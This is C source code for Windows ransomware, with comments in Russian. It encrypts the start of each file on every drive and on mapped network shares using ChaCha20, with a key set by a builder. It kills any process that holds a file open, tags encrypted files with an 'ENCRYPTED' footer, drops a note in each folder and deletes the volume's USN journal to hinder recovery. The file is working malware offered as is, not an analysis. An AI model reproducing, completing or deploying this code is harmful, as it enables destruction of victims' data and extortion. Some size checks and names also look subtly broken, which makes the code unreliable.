#include <windows.h>
#include "crypto.h"
#include "utils.h"

static BYTE chacha_key[32] = {0}; // Заполняется билдером
static BYTE nonce[12] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
static const float stripe_percent[5] = {2.0f, 1.0f, 0.6f, 0.6f, 0.6f}; // Из конфига
static const char* note_text = "Тестирование файлов прошло успешно, проведите тестирование расшифровки";

typedef struct {
    char path[MAX_PATH];
} FileTask;

void encrypt_file(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // Убиваем процесс, мешающий доступу
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(hSnapshot, &pe)) {
            do {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                TerminateProcess(hProc, 0);
                CloseHandle(hProc);
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    if (fileSize.QuadPart < 16) { CloseHandle(hFile); return; } // Пропускаем мелкие файлы

    // Проверка метки
    BYTE footer[16];
    SetFilePointer(hFile, -16, NULL, FILE_END);
    DWORD read;
    ReadFile(hFile, footer, 16, &read, NULL);
    if (memcmp(footer, "ENCRYPTED", 9) == 0) { CloseHandle(hFile); return; }

    // Определяем процент шифрования
    float percent = stripe_percent[0];
    if (fileSize.QuadPart > 100 * 1024 * 1024) percent = stripe_percent[1];
    if (fileSize.QuadPart > 1024 * 1024 * 1024) percent = stripe_percent[2];
    if (fileSize.QuadPart > 100 * 1024 * 1024 * 1024) percent = stripe_percent[3];
    if (fileSize.QuadPart > 1024 * 1024 * 1024 * 1024) percent = stripe_percent[4];
    percent += ((float)(rand() % 1000) / 1000.0f - 0.5f) * 0.5f; // Рандом ±0.25%

    BYTE* buffer = HeapAlloc(GetProcessHeap(), 0, fileSize.QuadPart);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, buffer, fileSize.QuadPart, &read, NULL);

    size_t encrypt_size = (size_t)(fileSize.QuadPart * percent / 100.0f);
    chacha20_encrypt(buffer, buffer, encrypt_size, chacha_key, nonce);
    memcpy(buffer + fileSize.QuadPart - 16, "ENCRYPTED", 9); // Метка

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, buffer, fileSize.QuadPart, &read, NULL);
    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(hFile);
}

DWORD WINAPI encrypt_thread(LPVOID param) {
    FileTask* task = (FileTask*)param;
    encrypt_file(task->path);
    HeapFree(GetProcessHeap(), 0, task);
    return 0;
}

void scan_directory(const char* dir) {
    char search[MAX_PATH];
    sprintf_s(search, sizeof(search), "%s\\*.*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                char subdir[MAX_PATH];
                sprintf_s(subdir, sizeof(subdir), "%s\\%s", dir, fd.cFileName);
                scan_directory(subdir);
            }
        } else {
            FileTask* task = HeapAlloc(GetProcessHeap(), 0, sizeof(FileTask));
            sprintf_s(task->path, sizeof(task->path), "%s\\%s", dir, fd.cFileName);
            CreateThread(NULL, 0, encrypt_thread, task, 0, NULL);
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    write_note(dir, note_text);
}

void scan_shares() {
    NETRESOURCEA nr = {0};
    HANDLE hEnum;
    WNetOpenEnumA(RESOURCE_GLOBALNET, RESOURCETYPE_DISK, 0, NULL, &hEnum);
    DWORD count = -1, buf_size = 16384;
    NETRESOURCEA* buffer = HeapAlloc(GetProcessHeap(), 0, buf_size);
    while (WNetEnumResourceA(hEnum, &count, buffer, &buf_size) == NO_ERROR) {
        for (DWORD i = 0; i < count; i++) {
            if (buffer[i].lpLocalName) scan_directory(buffer[i].lpLocalName);
        }
    }
    HeapFree(GetProcessHeap(), 0, buffer);
    WNetCloseEnum(hEnum);
}

void delete_shadow_copies() {
    HANDLE hVolume = CreateFileA("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVolume != INVALID_HANDLE_VALUE) {
        DWORD bytesReturned;
        DeviceIoControl(hVolume, FSCTL_DELETE_USN_JOURNAL, NULL, 0, NULL, 0, &bytesReturned, NULL);
        CloseHandle(hVolume);
    }
}

int main(int argc, char* argv[]) {
    srand(GetTickCount());
    delete_shadow_copies();

    if (argc > 1 && strcmp(argv[1], "-path") == 0 && argc > 2) {
        scan_directory(argv[2]);
    } else {
        char drive[4] = "C:\\";
        for (char c = 'A'; c <= 'Z'; c++) {
            drive[0] = c;
            if (GetDriveTypeA(drive) != DRIVE_NO_ROOT_DIR) scan_directory(drive);
        }
        scan_shares();
    }

    secure_zero(chacha_key, sizeof(chacha_key));
    return 0;
}